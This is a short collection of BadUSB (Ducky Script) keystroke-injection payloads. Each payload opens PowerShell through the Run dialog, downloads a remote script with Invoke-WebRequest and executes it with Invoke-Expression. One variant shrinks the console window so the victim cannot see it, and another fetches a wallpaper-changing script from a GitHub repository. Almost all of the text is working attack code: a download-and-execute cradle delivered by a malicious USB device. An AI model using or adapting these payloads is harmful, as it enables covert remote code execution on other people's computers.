Code

    LED 0 0 0
    DELAY 1000
    GUI r
    DELAY 100
    STRING powershell.exe
    ENTER
    DELAY 1000
    STRING $ScriptFromGithHub = Invoke-WebRequest https://example.com/powershellScript.ps1
    ENTER
    DELAY 500
    STRING Invoke-Expression $($ScriptFromGithHub.Content)
    ENTER
    STRING exit
    ENTER
    LED 0 0 255

Code

    LED 0 0 0
    DELAY 1000
    GUI r
    DELAY 100
    STRING powershell.exe
    ENTER
    DELAY 1000
    REM Once powershell is up and running, hide the console
    ALT SPACE
    STRING m
    LEFTARROW
    REPEAT 50 
    STRING [console]::WindowHeight=1 
    ENTER
    STRING [console]::WindowWidth=1 
    ENTER
    DELAY 1000
    STRING $ScriptFromGithHub = Invoke-WebRequest https://example.com/powershellScript.ps1
    ENTER
    DELAY 500
    STRING Invoke-Expression $($ScriptFromGithHub.Content)
    ENTER
    STRING exit
    ENTER
    LED 0 0 255


Example Change wallpaper

    LED 0 0 0
    DELAY 1000
    GUI r
    DELAY 100
    STRING powershell.exe
    ENTER
    DELAY 1000
    STRING $ScriptFromGithHub = Invoke-WebRequest https://raw.githubusercontent.com/offport/BadUSB/main/Windows/Payloads/ChangeWallpaper.ps1
    ENTER
    DELAY 500
    STRING Invoke-Expression $($ScriptFromGithHub.Content)
    ENTER
    STRING exit
    ENTER
    LED 0 0 255
